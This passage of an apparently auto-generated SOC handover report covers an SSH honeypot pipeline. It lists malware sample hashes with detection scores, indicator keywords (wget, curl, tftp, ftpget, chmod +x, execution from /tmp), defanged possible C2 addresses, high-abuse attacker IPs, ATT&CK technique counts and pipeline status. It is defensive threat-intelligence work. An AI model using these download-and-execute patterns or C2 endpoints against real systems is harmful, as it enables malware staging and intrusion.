| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `52.142.44[.]95` | US | Microsoft Corporation | **100** ⚠️ | 2 |
| `45.198.224[.]114` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 24 |
| `45.79.8[.]221` | US | Linode | **100** ⚠️ | 50 |
| `82.193.122[.]91` | UA | Industrial Media Network LLC | **100** ⚠️ | 50 |
| `68.7.114[.]69` | US | Cox Communications Inc. | **100** ⚠️ | 50 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `64.89.162[.]15` | NL | PIO-Hosting GmbH | **100** ⚠️ | 26 |
| `72.47.208[.]90` | US | GoDaddy.com, LLC | **100** ⚠️ | 11 |
| `61.2.44[.]54` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |
| `65.20.141[.]202` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 240 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 204 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 58 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 56 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 55 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 444 cases |
| Tool 34  | Credential Extractor        | ✅ 297 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 158 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (5.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 88 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 204 priority case(s) shown individually · 62 recon entry/entries in table (23 group(s) consolidating 175 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-09T15:19:00Z_
